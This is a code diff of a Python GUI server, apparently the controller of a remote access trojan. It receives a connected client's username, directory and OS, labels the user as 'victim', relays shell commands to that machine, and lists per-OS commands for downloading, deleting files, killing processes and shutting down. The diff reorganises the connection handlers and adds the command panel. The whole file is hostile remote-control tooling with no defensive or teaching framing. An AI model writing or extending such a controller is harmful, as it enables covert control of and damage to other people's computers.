@@ -8,8 +8,45 @@ import platform
 active_client = [None]  # Используем список как контейнер
 port = 12345
 active_user = ["Unknown"]  # Добавили имя пользователя
-global current_OS
+current_OS = "Unknown" 
 
+list_of_command = {
+        "Windows": [
+            "gdown <URL> <output_path> - скачивает файл с Google Drive",
+            "dir - показує вміст поточної директорії",
+            "cd <шлях> - змінює поточну директорію",
+            "ipconfig - мережеві інтерфейси",
+            "cls - очищення екрану",
+            "ping <адреса> - перевірка доступності",
+            "mkdir <папка> - нова директорія",
+            "exit - завершує роботу",
+            "copy <файл1> <файл2> - копіює файл",
+            "del <файл> - видаляє файл",
+            "move <файл> <папка> - переміщує файл",
+            "tasklist - список запущених процесів",
+            "taskkill /IM <ім'я процесу> - завершити процесс",
+            "chkdsk - проверка диска",
+            "shutdown /s - вимкнення комп'ютера",
+            "systeminfo - информация про систему",
+        ],
+        "Linux": [
+            "gdown <URL> <output_path> - скачивает файл с Google Drive",
+            "ls - перегляд вмісту каталогу",
+            "cd <шлях> - зміна каталогу",
+            "rm <файл> - видалення файлів",
+            "clear - очищення екрану",
+            "mkdir <каталог> - створення каталогу",
+            "exit - завершує роботу",
+            "cp <файл1> <файл2> - копіює файл",
+            "mv <файл> <каталог> - переміщує файл",
+            "touch <файл> - створення нового файлу",
+            "chmod <права> <файл> - зміна прав доступу",
+            "ps - список запущених процесів",
+            "kill <PID> - завершити процес",
+            "shutdown - вимкнення системи",
+            "ifconfig - налаштування мережевих інтерфейсов",
+        ]
+}
 
 def safe_textbox_insert(textbox, text):
     textbox.configure(state="normal")
@@ -24,7 +61,7 @@ def clear_frame(frame):
 def get_user_name(client_socket):
     user_name = ""
     while True:
-        data = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
+        data = client_socket.recv(10000).decode(encoding="utf-8", errors="replace")
         user_name += data
         if "END_OF_USER_MSG" in user_name:
             user_name = user_name.replace("END_OF_USER_MSG", "").strip()
@@ -34,7 +71,7 @@ def get_user_name(client_socket):
 def get_current_directory(client_socket):
     current_dir = ""
     while True:
-        data = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
+        data = client_socket.recv(10000).decode(encoding="utf-8", errors="replace")
         current_dir += data
         if "END_OF_DIR_MSG" in current_dir:
             current_dir = current_dir.replace("END_OF_DIR_MSG", "").strip()
@@ -45,7 +82,7 @@ def get_current_directory(client_socket):
 def read_all_info(client_socket):
     data = ""
     while True:
-        chunk = client_socket.recv(1024).decode("utf-8", errors="replace")
+        chunk = client_socket.recv(10000).decode("utf-8", errors="replace")
         if not chunk:
             break
         data += chunk
@@ -55,36 +92,6 @@ def read_all_info(client_socket):
             "END_OF_OS_MSG" in data):
             break
     return data
-
-def handle_client(client_socket, text_box, username_label, dir_label, os_label):
-    global current_OS
-
-    full_data = read_all_info(client_socket)
-
-    # Удаляем или заменяем все END_OF_MSG, если вдруг есть в начальных данных
-    full_data = full_data.replace("END_OF_MSG", " ")
-
-    # Парсим имя пользователя
-    user_name = full_data.split("END_OF_USER_MSG")[0].strip()
-
-    # Парсим директорию
-    current_dir = full_data.split("END_OF_USER_MSG")[1].split("END_OF_DIR_MSG")[0].strip()
-
-    # Парсим ОС
-    current_OS = full_data.split("END_OF_DIR_MSG")[1].split("END_OF_OS_MSG")[0].strip()
-
-    # Остаток, если нужно
-    remaining = full_data.split("END_OF_OS_MSG")[1].strip() if "END_OF_OS_MSG" in full_data else ""
-
-    # Обновляем UI
-    username_label.configure(text=f"Username victim: {user_name}")
-    dir_label.configure(text=f"Current dir: {current_dir}")
-    os_label.configure(text=f"OS: {current_OS}")
-
-
-    safe_textbox_insert(text_box, f"👤 Пользователь: {user_name}\n")
-    safe_textbox_insert(text_box, f"📁 Директория: {current_dir}\n")
-    safe_textbox_insert(text_box, f"🖥️ ОС: {current_OS}\n")
 
     # Далее можешь продолжить обрабатывать команды из remaining или читать из сокета, как у тебя дальше в коде...
 
@@ -109,29 +116,12 @@ def execute_command(command):
     except Exception as e:
         return f"❌ Ошибка выполнения команды: {e}"
 
-def start_server_thread(server_socket, text_box, status_label, username_label, dir_label, os_label):
-    while True:
-        try:
-            client_socket, client_address = server_socket.accept()
-            active_client[0] = client_socket
-            status_label.configure(text="🟢 Connected", text_color="green")
-            print(f"Клиент подключен: {client_address}")
-            text_box.insert("end", "Client is connected")
-            client_thread = threading.Thread(target=handle_client, args=(client_socket, text_box, username_label, dir_label, os_label))
-            client_thread.daemon = True
-            client_thread.start()
-        except Exception as e:
-            print(f"Ошибка подключения: {e}")
-            safe_textbox_insert(text_box, f"❌ Ошибка подключения: {e}\n")
-            status_label.configure(text="🔴 Error", text_color="red")
-            break
-
 def receive_full_response(client_socket):
     buffer = ""
     client_socket.settimeout(2)  # Например, 2 секунды ожидания новых данных
     try:
         while True:
-            data = client_socket.recv(1024).decode("utf-8", errors="replace")
+            data = client_socket.recv(10000).decode("utf-8", errors="replace")
             if not data:
                 break  # Соединение закрыто или нет данных
             buffer += data
@@ -188,6 +178,64 @@ def send_command_to_client(command_line, client_socket, text_box):
 def server(parent_frame, go_back_callback=None):
     clear_frame(parent_frame)
 
+    def handle_client(client_socket, text_box, username_label, dir_label, os_label):
+        global current_OS
+
+        full_data = read_all_info(client_socket)
+
+        # Удаляем или заменяем все END_OF_MSG, если вдруг есть в начальных данных
+        full_data = full_data.replace("END_OF_MSG", " ")
+
+        # Парсим имя пользователя
+        user_name = full_data.split("END_OF_USER_MSG")[0].strip()
+
+        # Парсим директорию
+        current_dir = full_data.split("END_OF_USER_MSG")[1].split("END_OF_DIR_MSG")[0].strip()
+
+        # Парсим ОС
+        current_OS = full_data.split("END_OF_DIR_MSG")[1].split("END_OF_OS_MSG")[0].strip()
+
+        # Остаток, если нужно
+        remaining = full_data.split("END_OF_OS_MSG")[1].strip() if "END_OF_OS_MSG" in full_data else ""
+
+        # Обновляем UI
+        username_label.configure(text=f"Username victim: {user_name}")
+        dir_label.configure(text=f"Current dir: {current_dir}")
+        os_label.configure(text=f"OS: {current_OS}")
+
+        # After you've set current_OS in handle_client, add:
+        if current_OS in list_of_command:
+            # Очистить контейнер команд
+            for widget in commands_container.winfo_children():
+                widget.destroy()
+
+            # Добавить команды в commands_container с place
+            y_position = 10  # начальная координата Y
+            for cmd in list_of_command[current_OS]:
+                command_label = ctk.CTkLabel(commands_container, text=cmd, width=660, wraplength=650)
+                command_label.pack(pady=3)
+
+        safe_textbox_insert(text_box, f"👤 Пользователь: {user_name}\n")
+        safe_textbox_insert(text_box, f"📁 Директория: {current_dir}\n")
+        safe_textbox_insert(text_box, f"🖥️ ОС: {current_OS}\n")
+
+    def start_server_thread(server_socket, text_box, status_label, username_label, dir_label, os_label):
+        while True:
+            try:
+                client_socket, client_address = server_socket.accept()
+                active_client[0] = client_socket
+                status_label.configure(text="🟢 Connected", text_color="green")
+                print(f"Клиент подключен: {client_address}")
+                text_box.insert("end", "Client is connected")
+                client_thread = threading.Thread(target=handle_client, args=(client_socket, text_box, username_label, dir_label, os_label))
+                client_thread.daemon = True
+                client_thread.start()
+            except Exception as e:
+                print(f"Ошибка подключения: {e}")
+                safe_textbox_insert(text_box, f"❌ Ошибка подключения: {e}\n")
+                status_label.configure(text="🔴 Error", text_color="red")
+                break
+
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Чтобы избежать WinError 10048
     try:
@@ -217,6 +265,9 @@ def server(parent_frame, go_back_callback=None):
     # bottom_frame.pack(fill="x", pady=10)
 
     menu_frame = ctk.CTkFrame(main_frame, width=700, fg_color="#08080A", corner_radius=10)
+
+    commands_container = ctk.CTkScrollableFrame(menu_frame, width=650, height=200)
+    commands_container.place(x=10, y=130)  # Под заголовками, с небольшим отступом
 
     close_menu = ctk.CTkButton(menu_frame, text="X", width=50, height=50, command=lambda: animate_sidebar_close(menu_frame))
     close_menu.place(relx=0.99, rely=0.05, anchor="ne")
@@ -270,8 +321,6 @@ def server(parent_frame, go_back_callback=None):
 
     os_label = ctk.CTkLabel(menu_frame, text="OS: Unknown", width=300)
     os_label.place(x=10, y=90)
-
-
 
     start_server_btn = ctk.CTkButton(left_frame, text="🚀 Start Server", command=lambda: run_server())
     start_server_btn.pack(pady=10)
@@ -432,41 +481,15 @@ def server(parent_frame, go_back_callback=None):
         height=40
     )
     hamburger_btn.place(relx=0.99, rely=0.1, anchor="ne")
-    
-    list_of_command = {
-        "Windows": [
-            "gdown <URL> <output_path> - скачивает файл с Google Drive",
-            "dir - показує вміст поточної директорії",
-            "cd <шлях> - змінює поточну директорію",
-            "ipconfig - мережеві інтерфейси",
-            "cls - очищення екрану",
-            "ping <адреса> - перевірка доступності",
-            "mkdir <папка> - нова директорія",
-            "exit - завершує роботу",
-            "copy <файл1> <файл2> - копіює файл",
-            "del <файл> - видаляє файл",
-            "move <файл> <папка> - переміщує файл",
-            "tasklist - список запущених процесів",
-            "taskkill /IM <ім'я процесу> - завершити процесс",
-            "chkdsk - проверка диска",
-            "shutdown /s - вимкнення комп'ютера",
-            "systeminfo - информация про систему",
-        ],
-        "Linux": [
-            "gdown <URL> <output_path> - скачивает файл с Google Drive",
-            "ls - перегляд вмісту каталогу",
-            "cd <шлях> - зміна каталогу",
-            "rm <файл> - видалення файлів",
-            "clear - очищення екрану",
-            "mkdir <каталог> - створення каталогу",
-            "exit - завершує роботу",
-            "cp <файл1> <файл2> - копіює файл",
-            "mv <файл> <каталог> - переміщує файл",
-            "touch <файл> - створення нового файлу",
-            "chmod <права> <файл> - зміна прав доступу",
-            "ps - список запущених процесів",
-            "kill <PID> - завершити процес",
-            "shutdown - вимкнення системи",
-            "ifconfig - налаштування мережевих інтерфейсов",
-        ]
-    }
+
+    # if current_OS in list_of_command:
+    #     # Очистить контейнер команд
+    #     for widget in commands_container.winfo_children():
+    #         widget.destroy()
+
+    #     # Добавить команды в commands_container с place
+    #     y_position = 10  # начальная координата Y
+    #     for cmd in list_of_command[current_OS]:
+    #         command_label = ctk.CTkLabel(commands_container, text=cmd)
+    #         command_label.place(x=10, y=y_position)
+    #         y_position += command_label.winfo_reqheight() + 5  # смещение по Y для следующей метки
